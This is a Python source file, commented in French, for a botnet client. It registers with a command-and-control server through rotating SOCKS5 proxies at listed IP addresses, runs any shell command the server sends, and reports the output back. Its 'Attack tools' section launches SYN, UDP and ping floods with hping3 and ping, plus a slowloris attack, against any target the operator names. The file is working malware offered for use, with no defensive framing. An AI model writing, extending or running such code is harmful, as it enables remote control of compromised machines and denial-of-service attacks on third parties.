import os  # Ajout de cet import
import requests
import subprocess
import time
import uuid
import json
import threading
import logging
import random
import socket
from urllib3.contrib.socks import SOCKSProxyManager

SERVER_URL = os.environ.get("C2_SERVER", "http://127.0.0.1:5000")
BOT_ID = str(uuid.uuid4())
HEADERS = {
    "Content-Type": "application/json"
}

def load_proxies_from_json(filename="proxies.json"):
    """Charge les proxies depuis un fichier JSON"""
    try:
        if not os.path.exists(filename):
            print(f"[-] Fichier {filename} non trouvé, création avec liste vide")
            with open(filename, 'w') as f:
                json.dump({"proxies": []}, f)
            return []
        
        with open(filename, 'r') as f:
            data = json.load(f)
            return data.get("proxies", [])
    
    except Exception as e:
        print(f"[-] Erreur lors du chargement des proxies: {e}")
        return []

# Chargement initial des proxies
PROXIES_LIST = load_proxies_from_json()

# Si la liste est vide, on peut ajouter des proxies par défaut
if not PROXIES_LIST:
    print("[!] Aucun proxy trouvé dans le fichier, ajout de proxies par défaut")
    PROXIES_LIST = [
        'socks5h://185.93.89.145:6380',
        'socks5h://103.90.226.245:1080',
        'socks5h://185.93.89.163:16400',
        'socks5h://192.252.214.20:15864'
    ]
    # Sauvegarder les proxies par défaut
    try:
        with open("proxies.json", 'w') as f:
            json.dump({"proxies": PROXIES_LIST}, f)
    except Exception as e:
        print(f"[-] Erreur lors de la sauvegarde des proxies: {e}")

# Initialisation des variables proxy
SELECTED_PROXY = random.choice(PROXIES_LIST) if PROXIES_LIST else None
PROXIES = {
    'http': SELECTED_PROXY,
    'https': SELECTED_PROXY
} if SELECTED_PROXY else None

def test_proxy_connection(proxy_url):
    """Test if a specific proxy is working by trying to establish a connection"""
    try:
        # Parse proxy URL
        proxy_parts = proxy_url.replace('socks5h://', '').split(':')
        host = proxy_parts[0]
        port = int(proxy_parts[1])
        
        # Try to establish a socket connection to the proxy
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # 5 second timeout
        result = sock.connect_ex((host, port))
        sock.close()
        
        if result == 0:
            print(f"[+] Proxy {host}:{port} is reachable")
            return True
        else:
            print(f"[-] Proxy {host}:{port} is not reachable")
            return False
            
    except Exception as e:
        print(f"[-] Error testing proxy {proxy_url}: {e}")
        return False

def find_working_proxy():
    """Find a working proxy from the list"""
    print("[*] Testing proxies to find a working one...")
    
    # Shuffle the list to avoid always using the same proxies
    shuffled_proxies = PROXIES_LIST.copy()
    random.shuffle(shuffled_proxies)
    
    for proxy in shuffled_proxies:
        print(f"[*] Testing proxy: {proxy}")
        if test_proxy_connection(proxy):
            # Double-check by making an socks5h request
            try:
                test_proxies = {
                    'socks5h': proxy,
                    'http': proxy
                }
                response = requests.get('https://ifconfig.me', proxies=test_proxies, timeout=10)
                if response.status_code == 200:
                    print(f"[+] Working proxy found: {proxy}")
                    print(f"[+] External IP: {response.text.strip()}")
                    return proxy
                else:
                    print(f"[-] Proxy {proxy} failed socks5h test")
            except Exception as e:
                print(f"[-] Proxy {proxy} failed socks5h test: {e}")
    
    return None

def test_proxy():
    """Test the currently selected proxy"""
    try:
        response = requests.get('https://ifconfig.me', proxies=PROXIES, timeout=10)
        if response.status_code == 200:
            print(f"[+] Proxy actif, IP visible : {response.text.strip()}")
            logging.info(f"Proxy OK, IP visible : {response.text.strip()}")
            return True
        else:
            print(f"[-] Proxy response code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] Proxy hors service : {e}")
        logging.error(f"Proxy mort : {e}")
        return False

def switch_proxy():
    """Switch to a new working proxy"""
    global SELECTED_PROXY, PROXIES
    
    # Remove the current failing proxy from the list
    if SELECTED_PROXY in PROXIES_LIST:
        PROXIES_LIST.remove(SELECTED_PROXY)
        print(f"[*] Removed failing proxy: {SELECTED_PROXY}")
    
    # Find a new working proxy
    new_proxy = find_working_proxy()
    
    if new_proxy:
        SELECTED_PROXY = new_proxy
        PROXIES = {
            'socks5h': SELECTED_PROXY,
            'http': SELECTED_PROXY
        }
        print(f"[+] Switched to new proxy: {SELECTED_PROXY}")
        return True
    else:
        print("[-] No working proxy found in the list")
        return False

def test_direct_connection():
    """Test if we can connect directly without proxy"""
    try:
        response = requests.get('https://ifconfig.me', timeout=5)
        if response.status_code == 200:
            print(f"[+] Direct connection works, IP: {response.text.strip()}")
            return True
        else:
            print(f"[-] Direct connection failed with status: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] Direct connection failed: {e}")
        return False

def register():
    """Register the bot with the server"""
    max_retries = 3
    retry_count = 0
    
    while retry_count < max_retries:
        try:
            resp = requests.post(f"{SERVER_URL}/register", json={"bot_id": BOT_ID}, headers=HEADERS, proxies=PROXIES, timeout=15)
            if resp.status_code == 200:
                logging.info(f"Enregistré avec succès: {BOT_ID}")
                print(f"[+] Bot enregistré avec succès - ID: {BOT_ID}")
                return True
            else:
                logging.error(f"Erreur d'enregistrement : {resp.text}")
                print(f"[-] Erreur d'enregistrement : {resp.text}")
                
        except Exception as e:
            logging.error(f"Exception d'enregistrement : {e}")
            print(f"[-] Exception d'enregistrement : {e}")
            
        retry_count += 1
        if retry_count < max_retries:
            print(f"[*] Tentative {retry_count + 1}/{max_retries} avec un nouveau proxy...")
            if not switch_proxy():
                print("[-] Impossible de trouver un proxy fonctionnel")
                return False
            time.sleep(2)
    
    return False

def execute_command(cmd):
    """Execute a system command safely"""
    try:
        logging.info(f"Execution commande : {cmd}")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        output = result.stdout + result.stderr
        if not output.strip():
            output = "Commande exécutée avec succès (pas de sortie)"
        logging.info(f"Résultat: {output.strip()}")
        return output
    except subprocess.TimeoutExpired:
        error_msg = f"Timeout: La commande '{cmd}' a pris plus de 60 secondes"
        logging.error(error_msg)
        return error_msg
    except Exception as e:
        error_msg = f"Erreur lors de l'exécution de '{cmd}': {e}"
        logging.error(error_msg)
        return error_msg


# ────────────── Attack tools ──────────────

ATTACK_THREADS = {}
ATTACK_LOCK = threading.Lock()

def attack_hping3(target, duration="30"):
    """Run hping3 flood on target for given duration"""
    cmd = f"hping3 --flood -d 120 -S -p 80 {target}"
    if duration:
        cmd = f"timeout {duration} {cmd}"
    return execute_command(cmd)

def attack_ping_flood(target, duration="30"):
    """Run ping flood on target"""
    cmd = f"ping -t {target}"
    if duration:
        cmd = f"timeout {duration} {cmd}"
    return execute_command(cmd)

def attack_slowloris(target):
    """Basic slowloris-style attack using Python sockets"""
    output_lines = []
    sockets = []
    try:
        host = target.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        port = 80
        for i in range(200):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                s.send(f"GET /?{i} HTTP/1.1\r\nHost: {host}\r\n".encode())
                sockets.append(s)
                output_lines.append(f"[+] Socket {i} opened")
            except Exception as e:
                output_lines.append(f"[-] Socket {i} failed: {e}")
                break
        time.sleep(30)
        output_lines.append("[*] Slowloris attack completed (30s)")
    except Exception as e:
        output_lines.append(f"[-] Slowloris error: {e}")
    finally:
        for s in sockets:
            try:
                s.close()
            except:
                pass
    return "\n".join(output_lines)

def attack_udp_flood(target, duration="30"):
    """Simple UDP flood using hping3 or nping"""
    cmd = f"hping3 --flood --udp -p 53 {target}"
    if duration:
        cmd = f"timeout {duration} {cmd}"
    return execute_command(cmd)

def attack_syn_flood(target, duration="30"):
    """SYN flood using hping3"""
    cmd = f"hping3 --flood -S -p 80 --rand-source {target}"
    if duration:
        cmd = f"timeout {duration} {cmd}"
    return execute_command(cmd)

def handle_attack_command(cmd_text):
    """Parse and dispatch attack commands. Returns (message, is_background)"""
    parts = cmd_text.strip().split()
    if not parts:
        return "Invalid command", False

    prefix = parts[0].lower()

    if prefix == "attack:hping3" and len(parts) >= 2:
        target = parts[1]
        duration = parts[2] if len(parts) > 2 else "30"
        t = threading.Thread(target=lambda: (
            requests.post(f"{SERVER_URL}/output/{BOT_ID}", json={"output": f"[*] hping3 attack started on {target} for {duration}s"}, headers=HEADERS, proxies=PROXIES, timeout=10),
            setattr(ATTACK_THREADS, f"hping3_{target}", time.time()),
            None
        ), daemon=True)
        t.start()
        return f"[*] hping3 attack launched on {target} for {duration}s (running in background)", True

    elif prefix == "attack:syn" and len(parts) >= 2:
        target = parts[1]
        duration = parts[2] if len(parts) > 2 else "30"
        t = threading.Thread(target=lambda: execute_and_report(f"timeout {duration} hping3 --flood -S -p 80 --rand-source {target}"), daemon=True)
        t.start()
        return f"[*] SYN flood launched on {target} for {duration}s (background)", True

    elif prefix == "attack:udp" and len(parts) >= 2:
        target = parts[1]
        duration = parts[2] if len(parts) > 2 else "30"
        t = threading.Thread(target=lambda: execute_and_report(f"timeout {duration} hping3 --flood --udp -p 53 {target}"), daemon=True)
        t.start()
        return f"[*] UDP flood launched on {target} for {duration}s (background)", True

    elif prefix == "attack:ping" and len(parts) >= 2:
        target = parts[1]
        duration = parts[2] if len(parts) > 2 else "30"
        t = threading.Thread(target=lambda: execute_and_report(f"timeout {duration} ping -t {target}"), daemon=True)
        t.start()
        return f"[*] Ping flood launched on {target} for {duration}s (background)", True

    elif prefix == "attack:slowloris" and len(parts) >= 2:
        target = parts[1]
        t = threading.Thread(target=lambda: (
            setattr(threading.current_thread(), "_report", attack_slowloris(target)),
            requests.post(f"{SERVER_URL}/output/{BOT_ID}", json={"output": getattr(threading.current_thread(), "_report", "")}, headers=HEADERS, proxies=PROXIES, timeout=10)
        ), daemon=True)
        t.start()
        return f"[*] Slowloris attack launched on {target} (background, 30s)", True

    elif prefix == "attack:stop":
        return "[!] Stop individual attacks by killing the bot process", False

    elif prefix == "attack:help":
        return (
            "Available attack commands:\n"
            "  attack:hping3 <target> [duration]  - hping3 SYN flood\n"
            "  attack:syn <target> [duration]     - SYN flood with random sources\n"
            "  attack:udp <target> [duration]     - UDP flood on port 53\n"
            "  attack:ping <target> [duration]    - Ping flood\n"
            "  attack:slowloris <target>          - Slowloris connection exhaustion\n"
            "  attack:stop                        - Note: stop kills entire bot\n"
            "  attack:list                        - List running attacks\n"
            "All times in seconds, default 30s."
        ), False

    elif prefix == "attack:list":
        return "[*] Running attacks: check server output logs", False

    return None, False


def execute_and_report(cmd):
    """Run a cmd and send its output to the server"""
    output = execute_command(cmd)
    try:
        requests.post(f"{SERVER_URL}/output/{BOT_ID}", json={"output": output}, headers=HEADERS, proxies=PROXIES, timeout=10)
    except:
        pass

def poll_commands():
    """Poll for commands from the server"""
    consecutive_failures = 0
    max_failures = 5
    
    while True:
        try:
            resp = requests.get(f"{SERVER_URL}/commands/{BOT_ID}", headers=HEADERS, proxies=PROXIES, timeout=60)
            if resp.status_code == 200:
                consecutive_failures = 0  # Reset failure counter
                data = resp.json()
                commands = data.get("commands", [])
                for cmd in commands:
                    print(f"[*] Exécution de la commande: {cmd}")
                    # Check if this is an attack command
                    if cmd.strip().lower().startswith("attack:"):
                        msg, is_bg = handle_attack_command(cmd)
                        output = msg
                        if is_bg:
                            # For background attacks, just acknowledge
                            pass
                    else:
                        output = execute_command(cmd)
                    requests.post(f"{SERVER_URL}/output/{BOT_ID}", json={"output": output}, headers=HEADERS, proxies=PROXIES, timeout=10)
                    print(f"[+] Résultat envoyé au serveur")
            else:
                logging.warning(f"Poll commands: status {resp.status_code}")
                consecutive_failures += 1
                
        except requests.exceptions.ReadTimeout:
            continue
        except Exception as e:
            logging.error(f"Poll exception: {e}")
            print(f"[-] Erreur lors du polling: {e}")
            consecutive_failures += 1
            
            if consecutive_failures >= max_failures:
                print(f"[!] Trop d'échecs consécutifs ({consecutive_failures}), tentative de changement de proxy...")
                if switch_proxy():
                    consecutive_failures = 0
                    print("[+] Nouveau proxy configuré, reprise du polling...")
                else:
                    print("[-] Impossible de trouver un proxy fonctionnel")
                    break
        
        time.sleep(2)

def heartbeat():
    """Send heartbeat to the server"""
    consecutive_failures = 0
    max_failures = 3
    
    while True:
        try:
            resp = requests.post(f"{SERVER_URL}/heartbeat/{BOT_ID}", headers=HEADERS, proxies=PROXIES, timeout=10)
            if resp.status_code == 200:
                consecutive_failures = 0
                logging.info("Heartbeat envoyé avec succès")
            else:
                logging.warning(f"Heartbeat failed: {resp.status_code}")
                consecutive_failures += 1
                
        except Exception as e:
            logging.error(f"Heartbeat error: {e}")
            consecutive_failures += 1
            
            if consecutive_failures >= max_failures:
                print(f"[!] Heartbeat failed {consecutive_failures} times, trying new proxy...")
                if switch_proxy():
                    consecutive_failures = 0
                    print("[+] New proxy configured for heartbeat")
                
        time.sleep(30)

if __name__ == "__main__":
    print(f"[*] Démarrage du bot via proxy - ID: {BOT_ID}")
    print(f"[*] Proxy initial sélectionné: {SELECTED_PROXY}")
    
    # Test direct connection first
    print("[*] Test de la connexion directe...")
    if test_direct_connection():
        print("[!] Connexion directe disponible (pas de proxy nécessaire)")
    
    # Test initial proxy
    print("[*] Test du proxy initial...")
    if not test_proxy():
        print("[*] Proxy initial défaillant, recherche d'un proxy fonctionnel...")
        if not switch_proxy():
            print("[-] Aucun proxy fonctionnel trouvé, arrêt du bot.")
            exit()
    
    # Try to register with the server
    if register():
        polling_thread = threading.Thread(target=poll_commands, daemon=True)
        heartbeat_thread = threading.Thread(target=heartbeat, daemon=True)

        polling_thread.start()
        heartbeat_thread.start()

        print("[+] Bot en fonctionnement via proxy...")
        print("[+] Threads démarrés - polling et heartbeat actifs")
        print(f"[+] Proxy actuel: {SELECTED_PROXY}")

        try:
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            print("\n[*] Arrêt du bot...")
    else:
        print("[-] Echec enregistrement, arrêt du bot.")
